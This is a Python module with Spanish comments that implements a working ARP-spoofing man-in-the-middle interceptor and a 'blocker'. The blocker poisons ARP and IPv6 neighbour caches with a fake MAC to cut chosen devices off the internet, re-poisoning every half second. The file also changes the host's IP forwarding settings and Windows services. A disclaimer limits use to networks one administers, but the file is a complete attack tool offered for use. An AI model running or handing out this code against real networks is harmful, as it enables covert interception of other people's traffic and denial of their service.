"""
mitm.py — Intercepcion selectiva por ARP spoofing.

Convierte este equipo en intermediario (man-in-the-middle) entre un dispositivo
objetivo y el router, para poder VER TODO su trafico. Disenado para que un
administrador inspeccione equipos de SU PROPIA red.

Diseno "bien hecho", no de prueba:
  - Intercepcion SELECTIVA (eliges que equipo inspeccionar), no toda la red a la
    vez. Spoofear la red entera es como se cae una red por accidente.
  - Reenvio de IP activado para NO cortarle internet al objetivo.
  - Restauracion automatica de las tablas ARP al detener o al cerrar el programa
    (la red queda sana, sin equipos "colgados").

USO LEGAL: solo en redes que administras o donde tienes permiso explicito.
"""

import re
import time
import platform
import subprocess
import threading
import atexit

_IS_WIN = platform.system() == "Windows"
_NO_WINDOW = 0x08000000 if _IS_WIN else 0

# MAC "agujero negro": localmente administrada y que NO existe en la LAN. El
# bloqueo le dice al objetivo que el router esta en esta MAC inexistente, asi sus
# tramas al router se pierden en el switch. Ventaja clave: NO depende del reenvio
# de IP del sistema (que en Windows a veces exige reiniciar), asi el bloqueo
# funciona aunque haya una intercepcion activa (que si necesita reenvio ON).
BLACKHOLE_MAC = "02:00:00:00:5e:00"


def _send_arp(iface=None, ether_src=None, **fields):
    """Envia una respuesta ARP como trama Ethernet unicast (por la interfaz
    correcta si se indica, para no salir por un adaptador virtual).

    ether_src fuerza la MAC de origen de la trama Ethernet: algunos equipos
    IGNORAN un ARP si la MAC de origen L2 no coincide con la del propio ARP
    (hwsrc). Ponerlas iguales hace que el envenenamiento "cuaje"."""
    from scapy.all import ARP, Ether, sendp
    destination = fields.get("hwdst")
    eth = Ether(dst=destination)
    if ether_src:
        eth.src = ether_src
    pkt = eth / ARP(**fields)
    if iface:
        sendp(pkt, iface=iface, verbose=0)
    else:
        sendp(pkt, verbose=0)


def _mac_from_arp(ip):
    """Lee la MAC de la tabla ARP del sistema. Fallback fiable cuando scapy no
    resuelve (p.ej. envio por el adaptador equivocado): el SO ya la tiene en
    cache tras el escaneo ARP inicial."""
    try:
        if _IS_WIN:
            out = subprocess.run(["arp", "-a", ip], capture_output=True,
                                 text=True, timeout=4,
                                 creationflags=_NO_WINDOW).stdout
        else:
            out = subprocess.run(["arp", "-n", ip], capture_output=True,
                                 text=True, timeout=4).stdout
    except Exception:
        return None
    m = re.search(r"([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}", out or "")
    if not m:
        return None
    mac = m.group(0).replace("-", ":").lower()
    return None if mac in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00") else mac


# --------------------------------------------------------------------------- #
#  IPv6 (NDP) — hoy la mayoria del trafico (YouTube, Google...) va por IPv6, y
#  ARP no lo toca. Para que el bloqueo corte de verdad hay que envenenar tambien
#  la cache de vecinos IPv6 del equipo: decirle que el router (su link-local) esta
#  en una MAC inexistente.
# --------------------------------------------------------------------------- #
def _gateway6():
    """Link-local IPv6 del router (siguiente salto por defecto), o '' si no hay
    IPv6 en la red."""
    try:
        from scapy.all import conf
        _iface, _src, nh = conf.route6.route("2000::")
        if nh and str(nh).lower().startswith("fe80"):
            return nh
    except Exception:
        pass
    return ""


def _eui64_ll(mac):
    """Link-local IPv6 derivada por EUI-64 (fallback si aun no vimos la real)."""
    try:
        b = [int(x, 16) for x in mac.split(":")]
        if len(b) != 6:
            return ""
    except Exception:
        return ""
    b[0] ^= 0x02
    iid = b[0:3] + [0xff, 0xfe] + b[3:6]
    return "fe80::%02x%02x:%02x%02x:%02x%02x:%02x%02x" % tuple(iid)


def _send_na(iface, dst_ip6, dst_mac, target_ip6, lladdr, src_ip6):
    """ICMPv6 Neighbor Advertisement spoofeado: 'target_ip6 esta en lladdr'.
    Override=1 fuerza actualizar la cache de vecinos del destino."""
    from scapy.all import Ether, sendp
    from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
    pkt = (Ether(dst=dst_mac) / IPv6(src=src_ip6, dst=dst_ip6) /
           ICMPv6ND_NA(tgt=target_ip6, R=0, S=0, O=1) /
           ICMPv6NDOptDstLLAddr(lladdr=lladdr))
    if iface:
        sendp(pkt, iface=iface, verbose=0)
    else:
        sendp(pkt, verbose=0)


# --------------------------------------------------------------------------- #
#  Reenvio de IP (para no cortarle internet al objetivo)
# --------------------------------------------------------------------------- #
# Estado del servicio RemoteAccess de Windows ANTES de que lo toquemos, para
# poder dejarlo como estaba al terminar (start type + si estaba corriendo).
_win_remoteaccess_prev = {"start": None, "running": None}


def _win_query_remoteaccess():
    try:
        cfg = subprocess.run(["sc", "qc", "RemoteAccess"], capture_output=True,
                             text=True, timeout=5).stdout
        state = subprocess.run(["sc", "query", "RemoteAccess"], capture_output=True,
                               text=True, timeout=5).stdout
    except Exception:
        return {"start": None, "running": None}
    start = None
    for line in cfg.splitlines():
        if "START_TYPE" in line:
            up = line.upper()
            start = ("disabled" if "DISABLED" in up else
                     "demand" if "DEMAND" in up else
                     "auto" if "AUTO" in up else None)
    running = ("RUNNING" in state.upper()) if state else None
    return {"start": start, "running": running}


def enable_ip_forwarding():
    system = platform.system()
    try:
        if system == "Linux":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
        elif system == "Darwin":  # macOS
            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"],
                           capture_output=True, timeout=5)
        elif system == "Windows":
            # Requiere admin. Puede necesitar reinicio la primera vez.
            if _win_remoteaccess_prev["start"] is None:
                _win_remoteaccess_prev.update(_win_query_remoteaccess())
            subprocess.run(
                ["reg", "add",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
                capture_output=True, timeout=5)
            subprocess.run(["sc", "config", "RemoteAccess", "start=", "auto"],
                           capture_output=True, timeout=5)
            subprocess.run(["net", "start", "RemoteAccess"],
                           capture_output=True, timeout=10)
    except Exception:
        pass


def disable_ip_forwarding():
    system = platform.system()
    try:
        if system == "Linux":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        elif system == "Darwin":
            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"],
                           capture_output=True, timeout=5)
        elif system == "Windows":
            subprocess.run(
                ["reg", "add",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "0", "/f"],
                capture_output=True, timeout=5)
            # Deja RemoteAccess como estaba antes de que lo tocaramos.
            prev = _win_remoteaccess_prev
            if prev["start"] is not None:
                if not prev["running"]:
                    subprocess.run(["net", "stop", "RemoteAccess"],
                                   capture_output=True, timeout=10)
                if prev["start"] in ("disabled", "demand", "auto"):
                    subprocess.run(
                        ["sc", "config", "RemoteAccess", "start=", prev["start"]],
                        capture_output=True, timeout=5)
                prev["start"] = prev["running"] = None
    except Exception:
        pass


# --------------------------------------------------------------------------- #
#  Interceptor
# --------------------------------------------------------------------------- #
class Interceptor:
    def __init__(self):
        self.targets = {}         # ip -> mac del objetivo
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_mac = None
        self.iface = None
        self._running = False
        self._thread = None
        self._lock = threading.Lock()

    # -- helpers scapy (import perezoso: no rompe si scapy/npcap falta) ------ #
    @staticmethod
    def _mac_of(ip, retries=3):
        """MAC de una IP local. Intenta scapy y, si falla, la tabla ARP del SO."""
        from scapy.all import getmacbyip
        for _ in range(retries):
            try:
                mac = getmacbyip(ip)
                if mac:
                    return mac.lower()
            except Exception:
                pass
            time.sleep(0.3)
        return _mac_from_arp(ip)

    def _setup(self):
        from scapy.all import conf, get_if_hwaddr
        # La ruta por defecto nos da LA interfaz con salida a internet: la usamos
        # para enviar por el adaptador correcto (en Windows con VPN/WSL/etc.
        # conf.iface suele apuntar al equivocado y el spoof no llega).
        iface, _out_ip, gw = conf.route.route("0.0.0.0")
        self.iface = iface
        self.gateway_ip = gw
        self.gateway_mac = self._mac_of(self.gateway_ip)
        try:
            self.my_mac = get_if_hwaddr(iface)
        except Exception:
            self.my_mac = None
        if not self.gateway_mac:
            raise RuntimeError("No se pudo resolver la MAC del router (gateway).")

    # -- objetivos ---------------------------------------------------------- #
    def add_target(self, ip, mac=None):
        """Anade un objetivo. Si se pasa la MAC ya conocida (del escaneo), se usa
        directamente: mucho mas fiable que re-resolverla en el momento."""
        mac = (mac or "").lower() or self._mac_of(ip)
        if not mac:
            return False
        with self._lock:
            self.targets[ip] = mac
        # spoof inmediato (varias rafagas) para que la intercepcion arranque ya
        if self.gateway_ip and self.gateway_mac:
            try:
                for _ in range(3):
                    _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
                              psrc=self.gateway_ip)
                    _send_arp(iface=self.iface, op=2, pdst=self.gateway_ip,
                              hwdst=self.gateway_mac, psrc=ip)
                    time.sleep(0.2)
            except Exception:
                pass
        return True

    def remove_target(self, ip):
        with self._lock:
            mac = self.targets.pop(ip, None)
        if mac and self.gateway_ip and self.gateway_mac:
            self._restore(ip, mac)
        return mac is not None

    def list_targets(self):
        with self._lock:
            return list(self.targets.keys())

    def running(self):
        return self._running

    # -- spoofing ----------------------------------------------------------- #
    def _spoof_once(self):
        with self._lock:
            items = list(self.targets.items())
        for ip, mac in items:
            # Al objetivo: "yo (router) estoy en mi_mac"
            _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
                      psrc=self.gateway_ip)
            # Al router: "yo (objetivo) estoy en mi_mac"
            _send_arp(iface=self.iface, op=2, pdst=self.gateway_ip,
                      hwdst=self.gateway_mac, psrc=ip)

    def _restore(self, ip, mac):
        """Reenvia las asociaciones ARP correctas para sanar la red."""
        for _ in range(5):
            _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
                      psrc=self.gateway_ip, hwsrc=self.gateway_mac)
            _send_arp(iface=self.iface, op=2, pdst=self.gateway_ip,
                      hwdst=self.gateway_mac, psrc=ip, hwsrc=mac)
            time.sleep(0.2)

    # -- ciclo de vida ------------------------------------------------------ #
    def start(self):
        if self._running:
            return
        self._setup()
        enable_ip_forwarding()
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        atexit.register(self.stop)

    def _loop(self):
        while self._running:
            try:
                self._spoof_once()
            except Exception:
                pass
            time.sleep(1.2)

    def stop(self):
        if not self._running:
            return
        self._running = False
        with self._lock:
            items = list(self.targets.items())
            self.targets.clear()
        for ip, mac in items:
            try:
                self._restore(ip, mac)
            except Exception:
                pass
        disable_ip_forwarding()


# instancia global
interceptor = Interceptor()


# =========================================================================== #
#  Blocker - corta el acceso a internet de un equipo (ARP sin reenvio)
# =========================================================================== #
class Blocker:
    """
    Bloquea el acceso a internet de un equipo por ARP spoofing "agujero negro":
    le dice al objetivo que el router esta en una MAC INEXISTENTE, asi sus tramas
    al router se pierden en el switch. Se revierte al desbloquear o cerrar.

    Antes se apoyaba en apagar el reenvio de IP del sistema; eso chocaba con la
    intercepcion (que lo necesita ENCENDIDO) y en Windows a veces exige reiniciar.
    Con el agujero negro el bloqueo es independiente del reenvio: puedes bloquear
    un equipo y estar inspeccionando otro a la vez sin que se pisen.
    """
    def __init__(self):
        self.targets = {}       # ip -> mac
        self.gateway_ip = None
        self.gateway_mac = None
        self.gateway6 = ""      # link-local IPv6 del router (si la red tiene IPv6)
        self.iface = None
        self._running = False
        self._thread = None
        self._lock = threading.Lock()

    def _setup(self):
        from scapy.all import conf
        iface, _out_ip, gw = conf.route.route("0.0.0.0")
        self.iface = iface
        self.gateway_ip = gw
        self.gateway_mac = Interceptor._mac_of(self.gateway_ip)
        if not self.gateway_mac:
            raise RuntimeError("No se pudo resolver la MAC del router.")
        self.gateway6 = _gateway6()   # '' si la red no tiene IPv6

    def _victim6(self, mac):
        """Link-local IPv6 del equipo: la real vista por el sniffer, o EUI-64."""
        try:
            from sniffer import monitor
            real = monitor.ip6_ll_for(mac)
            if real:
                return real
        except Exception:
            pass
        return _eui64_ll(mac)

    def _poison(self, ip, mac):
        """Envenena en LAS DOS direcciones (agresivo):
          - al equipo: "el router (gateway_ip) esta en la MAC agujero-negro"
            -> no puede ENVIAR al router.
          - al router: "el equipo (ip) esta en la MAC agujero-negro"
            -> no puede RECIBIR respuestas.
        La MAC de origen Ethernet se pone igual al agujero negro para que el ARP
        no lo descarte un equipo que valida la coherencia L2/ARP."""
        _send_arp(iface=self.iface, ether_src=BLACKHOLE_MAC, op=2,
                  pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=BLACKHOLE_MAC)
        _send_arp(iface=self.iface, ether_src=BLACKHOLE_MAC, op=2,
                  pdst=self.gateway_ip, hwdst=self.gateway_mac,
                  psrc=ip, hwsrc=BLACKHOLE_MAC)
        # IPv6: dile al equipo que el router (su link-local) esta en la MAC
        # agujero-negro -> su trafico IPv6 a internet se pierde.
        if self.gateway6:
            v6 = self._victim6(mac)
            if v6:
                try:
                    _send_na(self.iface, v6, mac, self.gateway6,
                             BLACKHOLE_MAC, self.gateway6)
                except Exception:
                    pass

    def _heal(self, ip, mac):
        """Restaura las asociaciones ARP (y NDP) correctas en ambos extremos."""
        _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
                  psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        _send_arp(iface=self.iface, op=2, pdst=self.gateway_ip,
                  hwdst=self.gateway_mac, psrc=ip, hwsrc=mac)
        if self.gateway6 and self.gateway_mac:
            v6 = self._victim6(mac)
            if v6:
                try:
                    _send_na(self.iface, v6, mac, self.gateway6,
                             self.gateway_mac, self.gateway6)
                except Exception:
                    pass

    def block(self, ip, mac=None):
        mac = (mac or "").lower() or Interceptor._mac_of(ip)
        if not mac:
            return False
        if not self._running:
            self._setup()
            self._running = True
            self._thread = threading.Thread(target=self._loop, daemon=True)
            self._thread.start()
            atexit.register(self.stop)
        with self._lock:
            self.targets[ip] = mac
        # rafaga inmediata fuerte: el corte se nota al instante
        try:
            for _ in range(12):
                self._poison(ip, mac)
                time.sleep(0.08)
        except Exception:
            pass
        return True

    def unblock(self, ip):
        with self._lock:
            mac = self.targets.pop(ip, None)
        if mac and self.gateway_ip and self.gateway_mac:
            for _ in range(6):
                try:
                    self._heal(ip, mac)
                except Exception:
                    pass
                time.sleep(0.2)
        if not self.list_targets():
            self.stop()
        return mac is not None

    def list_targets(self):
        with self._lock:
            return list(self.targets.keys())

    def _loop(self):
        # Re-envenena a alta frecuencia (cada 0.5s) para que el equipo no tenga
        # ventana de re-resolver la MAC real del router y colarse.
        while self._running:
            with self._lock:
                items = list(self.targets.items())
            for ip, mac in items:
                try:
                    self._poison(ip, mac)
                except Exception:
                    pass
            time.sleep(0.5)

    def stop(self):
        self._running = False
        # Sanar la red: devolver a cada equipo su asociacion ARP correcta,
        # si no lo hacemos se quedan sin internet hasta que caduque su cache.
        with self._lock:
            items = list(self.targets.items())
            self.targets.clear()
        if self.gateway_ip and self.gateway_mac:
            for ip, mac in items:
                for _ in range(6):
                    try:
                        self._heal(ip, mac)
                    except Exception:
                        pass
                    time.sleep(0.1)


blocker = Blocker()
